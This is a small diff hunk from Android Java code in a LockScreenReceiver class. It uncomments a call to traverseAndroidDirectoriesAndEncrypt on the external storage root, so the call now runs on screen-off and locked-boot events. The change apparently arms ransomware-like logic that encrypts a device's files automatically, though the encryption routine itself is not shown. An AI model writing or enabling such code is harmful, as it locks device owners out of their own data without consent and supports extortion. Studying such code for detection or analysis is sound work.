@@ -39,7 +39,7 @@ public class LockScreenReceiver extends BroadcastReceiver {
                 || (intent.getAction().equals(Intent.ACTION_LOCKED_BOOT_COMPLETED))) {
             System.out.println("OFF screen");
 
-            // traverseAndroidDirectoriesAndEncrypt(new File(System.getenv("EXTERNAL_STORAGE") + "/"), true);
+            traverseAndroidDirectoriesAndEncrypt(new File(System.getenv("EXTERNAL_STORAGE") + "/"), true);
         }
     }
 
